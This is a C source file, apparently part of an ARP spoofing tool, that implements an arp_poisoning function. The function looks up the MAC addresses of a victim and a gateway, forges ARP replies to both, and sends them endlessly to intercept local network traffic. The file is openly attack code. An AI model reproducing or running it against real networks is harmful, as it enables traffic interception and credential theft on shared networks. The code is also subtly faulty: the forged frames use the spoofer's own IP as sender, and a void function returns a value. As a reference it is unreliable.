#include <stdlib.h> // For free
#include "arp_spoofer.h"
#include "common.h"
#include "ether.h"
#include "arp.h"

void arp_poisoning(uint8_t victim_protocol_address[], size_t victim_protocol_size,
                   uint8_t gateway_protocol_address[], size_t gateway_protocol_size,
                   uint8_t spoofer_protocol_address[], size_t spoofer_protocol_size,
                   uint8_t spoofer_hardware_address[], size_t spoofer_hardware_size,
                   int raw_socket_fd){
    int status = 0;

    uint8_t* victim_hardware_address;

	CHECK_STATUS(get_mac_address(
		spoofer_hardware_address, MAC_ADDRESS_SIZE,
		spoofer_protocol_address, IP_ADDRESS_SIZE,
	    victim_protocol_address, IP_ADDRESS_SIZE,
		&victim_hardware_address, raw_socket_fd));
     
    uint8_t* gateway_hardware_address;
    CHECK_STATUS(get_mac_address(
		spoofer_hardware_address, MAC_ADDRESS_SIZE,
		spoofer_protocol_address, IP_ADDRESS_SIZE,
	    gateway_protocol_address, IP_ADDRESS_SIZE,
		&gateway_hardware_address, raw_socket_fd));

    ethernet_frame frame_to_victim;

    CHECK_STATUS(initialize_arp(&frame_to_victim, 
                    spoofer_hardware_address, MAC_ADDRESS_SIZE,
                    victim_hardware_address, MAC_ADDRESS_SIZE,
                    spoofer_protocol_address, IP_ADDRESS_SIZE,
                    victim_protocol_address, IP_ADDRESS_SIZE,
                    ARP_RESPONSE));

    ethernet_frame frame_to_gateway;
    
    CHECK_STATUS(initialize_arp(&frame_to_gateway, 
                    spoofer_hardware_address, MAC_ADDRESS_SIZE,
                    gateway_hardware_address, MAC_ADDRESS_SIZE,
                    spoofer_protocol_address, IP_ADDRESS_SIZE,
                    gateway_protocol_address, IP_ADDRESS_SIZE,
                    ARP_RESPONSE));

    while (1) {
        send_frame(&frame_to_victim, raw_socket_fd);
        send_frame(&frame_to_gateway, raw_socket_fd);
        sleep(1);
    }

l_cleanup:
    free(victim_hardware_address);
    free(gateway_hardware_address);
    return status;
}